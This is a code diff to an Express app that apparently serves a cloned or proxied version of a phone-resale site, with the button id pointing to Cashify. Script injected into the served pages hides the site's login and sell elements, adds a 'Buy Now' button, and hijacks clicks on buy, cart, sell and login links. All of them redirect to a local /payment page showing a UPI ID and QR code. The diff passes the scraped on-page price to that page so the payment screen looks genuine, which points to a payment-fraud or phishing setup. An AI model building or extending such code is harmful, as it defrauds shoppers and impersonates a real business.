@@ -245,6 +245,11 @@ app.use("/payment", (req, res) => {
   const cfg = loadConfig();
   const upiId  = cfg.upiId  || "yourname@upi";
   const qrSrc  = cfg.qrFile ? `/public/qr.png?t=${Date.now()}` : null;
+  // Price from query param (passed by Buy Now button), fallback 499
+  const PRICES = [300, 349, 399, 450, 499, 549, 567, 599, 649, 699, 749, 799, 849, 899, 949, 999];
+  const rawPrice = parseInt(req.query.price, 10);
+  const displayPrice = (!isNaN(rawPrice) && rawPrice > 0) ? rawPrice : 499;
+  const displayPriceFmt = displayPrice.toLocaleString('en-IN');
     res.send(`
       <!DOCTYPE html>
       <html lang="en">
@@ -321,7 +326,7 @@ app.use("/payment", (req, res) => {
                     <p class="font-semibold text-gray-800 text-sm">Refurbished Smartphone</p>
                     <p class="text-xs text-gray-400">Grade A • 6 months warranty</p>
                   </div>
-                  <span class="font-bold text-blue-600 text-lg">₹32,500</span>
+                  <span class="font-bold text-blue-600 text-lg">₹${displayPriceFmt}</span>
                 </div>
 
                 <div class="space-y-3">
@@ -382,7 +387,7 @@ app.use("/payment", (req, res) => {
                 <div class="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100 rounded-xl p-4 flex justify-between items-center mb-4">
                   <div>
                     <p class="text-xs text-gray-400">Total Amount</p>
-                    <p class="text-2xl font-bold text-blue-600">₹32,500</p>
+                    <p class="text-2xl font-bold text-blue-600">₹${displayPriceFmt}</p>
                   </div>
                   <div class="text-right">
                     <p class="text-xs text-gray-400">Payment to</p>
@@ -748,7 +753,20 @@ app.use(
                      const btn = document.createElement('div');
                      btn.id = '__cashify_buy_btn__';
                      btn.innerHTML = \`
-                       <button onclick="window.location.href='/payment'" style="
+                       <button onclick="
+                         (function() {
+                           var price = 499;
+                           var spans = document.querySelectorAll('span, p, strong, b');
+                           for (var i = 0; i < spans.length; i++) {
+                             var t = (spans[i].textContent || '').trim();
+                             if (/^₹[\\d,]+$/.test(t) && spans[i].children.length === 0) {
+                               var n = parseInt(t.replace(/[₹,]/g,''), 10);
+                               if (!isNaN(n) && n >= 100) { price = n; break; }
+                             }
+                           }
+                           window.location.href = '/payment?price=' + price;
+                         })()
+                       " style="
                          position: fixed;
                          bottom: 24px;
                          left: 50%;
@@ -789,16 +807,22 @@ app.use(
 
                    // ── Run everything ──
                    function runAll() {
-                     processNode(document.body);
+                     // Only process prices once on initial load, not on every mutation
                      removeSellElements();
                      hideLoginElements();
                      injectBuyNowButton();
                    }
 
-                   if (document.body) runAll();
-                   document.addEventListener('DOMContentLoaded', runAll);
+                   // First load: process prices once
+                   function initialPricePass() {
+                     processNode(document.body);
+                   }
+
+                   if (document.body) { initialPricePass(); runAll(); }
+                   document.addEventListener('DOMContentLoaded', () => { initialPricePass(); runAll(); });
 
                    // MutationObserver — catches React re-renders and lazy-loaded content
+                   // Only processNode on newly ADDED nodes (not whole body) to stop flickering
                    const observer = new MutationObserver(mutations => {
                      observer.disconnect();
                      mutations.forEach(m => {
@@ -810,7 +834,6 @@ app.use(
                    });
 
                    document.addEventListener('DOMContentLoaded', () => {
-                     runAll();
                      observer.observe(document.body, { childList: true, subtree: true });
                    });
 
@@ -825,7 +848,26 @@ app.use(
                      }
                    }).observe(document, { subtree: true, childList: true });
 
-                   [500, 1500].forEach(t => setTimeout(runAll, t));
+                   [500, 1500].forEach(t => setTimeout(() => { removeSellElements(); injectBuyNowButton(); }, t));
+
+                   // ── Helper: find nearest price from a DOM node ──
+                   function getNearbyPrice(startNode) {
+                     let node = startNode;
+                     for (let i = 0; i < 10; i++) {
+                       if (!node) break;
+                       const candidates = node.querySelectorAll ? node.querySelectorAll('span, p, div, strong, b') : [];
+                       for (const s of candidates) {
+                         if (s.children.length > 0) continue; // skip containers
+                         const t = (s.textContent || '').trim();
+                         if (/^₹[\d,]+$/.test(t)) {
+                           const n = parseInt(t.replace(/[₹,]/g,''), 10);
+                           if (!isNaN(n) && n >= 100) return n;
+                         }
+                       }
+                       node = node.parentElement;
+                     }
+                     return 499;
+                   }
 
                    // Intercept sell link clicks → /payment
                    document.addEventListener('click', function(e) {
@@ -833,7 +875,8 @@ app.use(
                      if (a && a.href && /\\/sell|\\/selling/i.test(new URL(a.href).pathname)) {
                        e.preventDefault();
                        e.stopPropagation();
-                       window.location.href = '/payment';
+                       const price = getNearbyPrice(e.target);
+                       window.location.href = '/payment?price=' + price;
                      }
                    }, true);
 
@@ -867,7 +910,8 @@ app.use(
                        if ((isBtn && isBuyCTA) || isCartClass || isAuthLink) {
                          e.preventDefault();
                          e.stopImmediatePropagation();
-                         window.location.href = '/payment';
+                         const price = getNearbyPrice(e.target);
+                         window.location.href = '/payment?price=' + price;
                          return;
                        }
                        node = node.parentElement;
